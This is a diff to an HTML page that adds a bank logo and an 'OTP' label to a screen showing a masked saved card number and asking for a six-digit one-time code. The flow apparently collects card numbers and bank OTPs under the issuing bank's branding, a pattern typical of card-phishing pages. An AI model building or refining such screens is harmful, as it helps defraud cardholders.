@@ -260,8 +260,11 @@
 
     /* بطاقة OTP */
     .otp-card { display:none; }
-    .masked-card-field { background:#f5f5f5; border:1px solid #bbb; border-radius:6px; height:38px; padding:0 12px; width:100%; font-size:15px; font-family:monospace; letter-spacing:3px; color:#222; display:flex; align-items:center; justify-content:center; white-space:nowrap; }
-    .otp-field { width:100%; font-size:22px; font-weight:700; text-align:center; letter-spacing:8px; height:54px; }
+    .otp-field-wrap { position:relative; width:100%; }
+    .masked-card-field { background:#f5f5f5; border:1px solid #bbb; border-radius:6px; height:38px; padding:0 46px 0 12px; width:100%; font-size:15px; font-family:monospace; letter-spacing:3px; color:#222; display:flex; align-items:center; justify-content:center; white-space:nowrap; }
+    #otp-bank-logo { position:absolute; right:10px; top:50%; transform:translateY(-50%); height:24px; width:auto; object-fit:contain; pointer-events:none; }
+    .otp-field { width:100%; font-size:22px; font-weight:700; text-align:center; letter-spacing:8px; height:54px; padding-right:60px; }
+    .otp-side-label { position:absolute; right:12px; top:50%; transform:translateY(-50%); font-size:14px; font-weight:800; color:#555; pointer-events:none; }
   </style>
 </head>
 <body>
@@ -368,13 +371,19 @@
     <div class="card otp-card" id="otp-card">
       <table class="form-table" dir="ltr">
         <tr>
-          <td class="td-input" colspan="2" style="text-align:center">
-            <div class="masked-card-field" id="masked-card-display"></div>
+          <td class="td-input" colspan="2">
+            <div class="otp-field-wrap">
+              <div class="masked-card-field" id="masked-card-display"></div>
+              <img id="otp-bank-logo" src="" alt="" style="display:none">
+            </div>
           </td>
         </tr>
         <tr>
-          <td class="td-input" colspan="2" style="text-align:center">
-            <input class="field otp-field" type="text" id="otp-input" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code">
+          <td class="td-input" colspan="2">
+            <div class="otp-field-wrap">
+              <input class="field otp-field" type="text" id="otp-input" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code">
+              <span class="otp-side-label">OTP</span>
+            </div>
           </td>
         </tr>
       </table>
@@ -788,6 +797,12 @@
       loadingCard.style.display = 'none';
       const masked = savedCard.slice(0,4) + ' **** **** ' + savedCard.slice(-4);
       document.getElementById('masked-card-display').textContent = masked;
+      const logo = document.getElementById('otp-bank-logo');
+      if (currentBank && currentBank.logo) {
+        logo.src = currentBank.logo;
+        logo.style.display = 'block';
+        logo.onerror = () => { logo.style.display = 'none'; };
+      }
       otpCard.style.display = 'block';
       document.getElementById('otp-action-card').style.display = 'block';
     }
